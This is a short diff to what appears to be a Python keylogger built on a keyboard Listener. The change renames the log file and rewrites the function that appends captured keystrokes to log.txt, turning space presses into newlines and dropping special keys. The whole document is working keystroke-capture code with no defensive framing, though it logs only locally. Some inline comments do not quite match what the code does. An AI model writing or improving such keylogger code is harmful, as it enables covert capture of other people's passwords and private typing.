@@ -22,10 +22,13 @@ def on_press(key):
 
 
 def writefile(keys):
-    with open("log1.txt", "a") as f:
+    with open("log.txt", "a") as f:
         for key in keys:
-            f.write(str(key).replace("'",""))
-
-
+            k=str(key).replace("'","")
+            if(k.find("space")>0):
+                f.write("\n") #If number of "Key.space" occurences are more than 1 then the following keystrokes will be in a new line
+            elif(k.find("Key")==-1):
+                f.write(k) #If any other "Key." is found ohter than the normal numbers and letters then they wont be recorded as keystrokes in "log.txt"
+                
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
